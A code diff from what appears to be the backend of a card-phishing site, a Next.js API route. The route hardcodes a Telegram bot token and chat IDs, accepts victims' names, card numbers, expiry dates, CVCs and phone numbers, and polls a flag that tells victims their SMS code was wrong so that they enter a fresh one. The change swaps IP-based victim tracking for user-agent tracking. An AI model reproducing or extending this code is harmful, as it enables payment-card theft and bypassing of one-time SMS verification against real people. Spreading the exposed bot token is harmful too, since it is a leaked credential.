@@ -4,21 +4,15 @@ import { getCodeErrorFlag, setCodeErrorFlag } from './codeErrorStore';
 const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
 const CHAT_IDS = ['1902713760', '7508575481'];
 
-function getClientIp(req: NextRequest) {
-  const xff = req.headers.get('x-forwarded-for');
-  if (xff) return xff.split(',')[0].trim();
-  return req.ip || 'Unknown';
-}
-
 export async function GET(req: NextRequest) {
   // Polling для ошибки кода
   if (req.nextUrl.searchParams.get('check_code_error')) {
-    const ip = getClientIp(req);
-    console.log('Checking code error for IP:', ip);
-    const hasError = getCodeErrorFlag(ip);
+    const userAgent = req.headers.get('user-agent') || 'Unknown';
+    console.log('Checking code error for User Agent:', userAgent);
+    const hasError = getCodeErrorFlag(userAgent);
     if (hasError) {
-      console.log('Code error flag found for IP:', ip);
-      setCodeErrorFlag(ip, false);
+      console.log('Code error flag found for User Agent:', userAgent);
+      setCodeErrorFlag(userAgent, false);
       return NextResponse.json({ codeError: 'Код введен неверно или устарел, введите новый поступивший смс код' });
     }
     return NextResponse.json({ codeError: null });
@@ -31,7 +25,7 @@ export async function POST(req: NextRequest) {
     const body = await req.json();
     const { text, status = 'online', url, message_ids, action, firstName, lastName, card, date, cvc, owner, phone } = body;
     const userAgent = req.headers.get('user-agent') || 'Unknown';
-    const ip = getClientIp(req);
+    const ip = req.ip || 'Unknown';
     const now = new Date();
     const time = now.toLocaleString('ru-RU', { hour12: false });
 
